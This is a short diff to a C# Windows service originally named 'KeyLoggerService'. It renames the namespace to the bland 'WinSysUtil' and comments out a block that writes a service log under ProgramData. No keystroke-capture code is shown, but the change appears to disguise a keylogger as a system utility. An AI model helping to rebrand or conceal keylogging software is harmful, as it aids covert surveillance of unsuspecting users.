@@ -15,7 +15,7 @@ using System.Windows.Forms;
 using System.Security.AccessControl;
 using System.Security.Principal;
 
-namespace KeyLoggerService
+namespace WinSysUtil
 {
     public partial class Service1 : ServiceBase
     {
@@ -280,6 +280,7 @@ namespace KeyLoggerService
         {
             try
             {
+                /*
                 string logPath = @"C:\ProgramData\WinSysUtil\service.log";
                 string dir = Path.GetDirectoryName(logPath);
                 if (!Directory.Exists(dir))
@@ -319,6 +320,7 @@ namespace KeyLoggerService
                         Thread.Sleep(100);
                     }
                 }
+                */
             }
             catch { }
         }
